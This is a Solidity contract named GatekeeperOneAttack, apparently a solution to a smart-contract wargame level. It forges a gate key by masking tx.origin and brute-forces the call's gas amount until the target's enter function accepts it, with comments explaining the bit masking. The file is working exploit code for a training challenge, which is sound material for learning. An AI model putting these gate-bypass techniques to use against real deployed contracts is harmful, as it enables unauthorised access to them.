// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";

contract GatekeeperOneAttack {
    
    function Attack(address _target) external {

        // Bit Masking (&&)
        // 1 & 0 => 0
        // 0 & 1 => 0
        // 0 & 0 => 0
        // 1 & 1 => 1

        // First tx.origin(20 bytes) is convert into the 8 bytes 
        // Bit masking it with FFFFFFFF0000FFFF (Here F=1111);
        // After bit masking it converted into the bytes8

        bytes8 _gateKeeper = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);

        for(uint16 i=268; i < 300;){
            uint256 totalGas = i + (8191 * 3);
            (bool success,) = _target.call{gas:totalGas}(abi.encodeWithSignature("enter(bytes8)", _gateKeeper));

            if(success){
                console.log("i is: ",i);
                break;
            }
            unchecked {
                ++i;
            }
        }

    }
}